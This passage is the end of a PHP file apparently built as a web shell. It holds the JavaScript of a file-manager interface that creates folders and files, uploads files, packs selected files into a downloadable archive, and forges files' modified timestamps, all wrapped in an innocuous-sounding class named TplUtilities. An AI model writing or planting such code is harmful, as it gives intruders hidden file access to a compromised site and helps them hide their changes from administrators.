          else if (act === 'chdate') { const def = ts ? new Date(Number(ts) * 1000).toISOString().replace('T', ' ').slice(0, 19) : ''; openChdate(f, def); }
        }
        function openChdate(f, def){
          openModal('<h3><span>set modified time: ' + escapeHtml(f) + '</span><a href="#" class="modal-close">&#x2715; close</a></h3>'
            + '<input type="text" id="dt-input" value="' + escapeHtml(def) + '" placeholder="Y-m-d H:i:s" style="width:100%;background:#05080d;color:var(--green);border:1px solid var(--border);border-radius:6px;padding:11px;font-family:inherit;font-size:13px;outline:none;margin-bottom:12px">'
            + '<div class="modal-actions"><button id="dt-save" class="btn">&#x1F4BE; set time</button><button id="dt-cancel" class="btn ghost">cancel</button></div>');
          document.getElementById('dt-save').onclick = function(){ const v = document.getElementById('dt-input').value; if (v) ajaxPost('chdate', f, { datetime: v }); closeModal(); };
          document.getElementById('dt-cancel').onclick = closeModal;
          setTimeout(function(){ var el = document.getElementById('dt-input'); if (el) el.focus(); }, 40);
        }
        function ajaxGet(act, f){ fetch(SELF + '&ajax=' + act + '&p=' + encodeURIComponent(curP) + '&f=' + encodeURIComponent(f)).then(r => r.json()).then(d => { toast(d.msg, d.ok ? 'ok' : 'err'); loadDir(curP); }); }
        function ajaxPost(act, f, obj){ const fd = new FormData(); for (const k in obj) fd.append(k, obj[k]); fetch(SELF + '&ajax=' + act + '&p=' + encodeURIComponent(curP) + '&f=' + encodeURIComponent(f), { method:'POST', body:fd }).then(r => r.json()).then(d => { toast(d.msg, d.ok ? 'ok' : 'err'); loadDir(curP); }); }
        function ajaxUpload(act, fd){ fetch(SELF + '&ajax=' + act + '&p=' + encodeURIComponent(curP), { method:'POST', body:fd }).then(r => r.json()).then(d => { toast(d.msg, d.ok ? 'ok' : 'err'); loadDir(curP); }); }

        document.getElementById('mkform').onsubmit = e => { e.preventDefault(); ajaxUpload('mkdir', new FormData(e.target)); };
        document.getElementById('nfform').onsubmit = e => { e.preventDefault(); ajaxUpload('newfile', new FormData(e.target)); };
        document.getElementById('upform').onsubmit = e => { e.preventDefault(); ajaxUpload('upload', new FormData(e.target)); };

        document.getElementById('packbtn').onclick = function(){
          const fnames = Array.from(document.querySelectorAll('#filelist input[name="sel[]"]:checked')).map(c => c.value);
          if (!fnames.length) { toast('no files/folders selected', 'err'); return; }
          const fd = new FormData();
          fnames.forEach(n => fd.append('sel[]', n));
          fd.append('fmt', document.getElementById('packfmt').value);
          setLoading(true);
          fetch(SELF + '&ajax=pack', { method:'POST', body: fd })
            .then(r => {
              const ct = r.headers.get('content-type') || '';
              if (ct.indexOf('json') !== -1) { r.json().then(d => toast(d.msg, 'err')); setLoading(false); }
              else { r.blob().then(b => { const u = URL.createObjectURL(b); const a = document.createElement('a'); a.href = u; a.download = 'archive.' + document.getElementById('packfmt').value; a.click(); URL.revokeObjectURL(u); toast('archive downloaded', 'ok'); setLoading(false); }); }
            })
            .catch(e => { toast('pack failed: ' + e, 'err'); setLoading(false); });
        };

        loadDir(<?php echo json_encode($init); ?>);
        </script></div></body></html>
        <?php
        exit;
    }
}

$util = new TplUtilities();
$util->run();
